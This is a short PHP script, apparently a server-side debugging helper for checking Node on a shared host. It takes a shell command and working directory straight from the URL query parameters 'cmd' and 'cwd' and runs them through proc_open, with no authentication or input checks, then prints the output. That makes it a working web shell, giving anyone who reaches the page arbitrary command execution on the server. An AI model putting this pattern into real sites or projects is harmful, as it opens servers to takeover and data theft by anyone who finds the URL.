<?php
header('Content-Type: text/plain; charset=utf-8');

echo "=== Node process execution via proc_open ===\n";

if (!function_exists('proc_open')) {
    die("proc_open is disabled");
}

$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : 'node -v';
$cwd = isset($_GET['cwd']) ? $_GET['cwd'] : '/home/u754458241/domains/morsall.com/nodejs';

echo "Running command: $cmd\n";
echo "Working directory: $cwd\n\n";

$descriptorspec = [
    0 => ["pipe", "r"], // stdin
    1 => ["pipe", "w"], // stdout
    2 => ["pipe", "w"]  // stderr
];

$process = proc_open($cmd, $descriptorspec, $pipes, $cwd);

if (is_resource($process)) {
    // We don't write anything to stdin
    fclose($pipes[0]);

    $stdout = stream_get_contents($pipes[1]);
    fclose($pipes[1]);

    $stderr = stream_get_contents($pipes[2]);
    fclose($pipes[2]);

    $return_value = proc_close($process);

    echo "=== STDOUT ===\n$stdout\n";
    echo "=== STDERR ===\n$stderr\n";
    echo "Exit Code: $return_value\n";
} else {
    echo "Failed to start process\n";
}
?>
